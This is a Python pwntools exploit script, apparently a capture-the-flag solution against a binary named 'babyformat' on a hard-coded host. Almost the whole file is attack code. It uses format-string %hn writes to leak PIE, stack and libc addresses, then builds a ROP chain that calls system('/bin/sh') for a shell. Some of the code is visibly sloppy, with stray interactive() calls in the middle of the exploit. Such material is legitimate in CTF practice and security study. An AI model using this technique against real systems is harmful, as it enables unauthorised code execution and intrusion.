#!/usr/bin/python
from pwn import *
import sys

LOCAL = True

HOST = "104.196.99.62"
PORT = 2222

def write_param(param, value):
	r.send("%%%du%%%d$hn" % (value, param))

def prepare_address(address):
	# write address to param 61
	HIADDR = (address & 0xffff0000) >> 16
	LOADDR = address & 0xffff

	write_param(57, LOADDR)
	write_param(59, HIADDR)

def write_value(address, value):
	# write lo word via 61
	prepare_address(address)
	write_param(61, value & 0xffff)

	# write hi word via 61
	prepare_address(address+2)
	write_param(61, (value & 0xffff0000) >> 16)

def write_payload (address, payload):
  	for i in range(len(payload)):
		write_value(address + (i*4), payload[i])
    	r.interactive()

def leak_rop(ret, address):
  	payload = [e.address + 0x8ed, address] 

  	write_payload(ret, payload)

  	r.sendline("EXIT")
  	r.recvline()

  	LEAK = u32(r.recv(4))

  	return LEAK


def exploit(r):
	r.recvline()

	r.send("%1$p%9$p")

	PIE = int(r.recv(10), 16)
	e.address = PIE - 0x202c
	STACK = int(r.recv(10), 16)
	
	log.info("PIE leak       : %s" % hex(PIE))
	log.info("PIE            : %s" % hex(e.address))
	log.info("STACK leak     : %s" % hex(STACK))
	pause()
	
	log.info("Overwrite pointer for parameter 57 with pointer to counter")

	COUNTER = STACK - 0xb8 + 3

	write_param(9, (COUNTER & 0xffff))
	
	log.info("Overwrite counter to negative value")
	
	write_param(57, 0xff)

	r.interactive()
	log.info("Prepare stack writer")

	STACK1 = STACK + 0x10
	STACK2 = STACK + 0x10 + 2

	write_param(9, STACK1 & 0xffff)
	write_param(10, STACK2 & 0xffff)

	RET = STACK - 0x98

	# PUTS = leak_rop(RET, e.got["puts"]) 
	# log.info("PUTS          : %s" % hex(PUTS))
	
	log.info("Leak libc address")
		
	write_value(STACK + 0x4, e.got["read"])

	r.interactive()

	r.sendline("%58$s")

	READ = u32(r.recv(4))
	libc.address = READ - libc.symbols["read"]
	
	log.info("LIBC              : %s" % hex(libc.address))

	log.info("Write system('/bin/sh') ropchain")

	payload = [libc.symbols["system"], 0xdeadbeef, next(libc.search("/bin/sh"))]

	write_payload(RET, payload)
	
	r.sendline("EXIT")

	pause()
	r.interactive()




if __name__ == "__main__":
	e = ELF("./babyformat")
	libc = ELF("./libc.so.6")

	if len(sys.argv) > 1:
		LOCAL = False
		r = remote(HOST, PORT)
		exploit(r)
	else:
		LOCAL = True
		r = process("./babyformat")
		print util.proc.pidof(r)
		pause()
		exploit(r)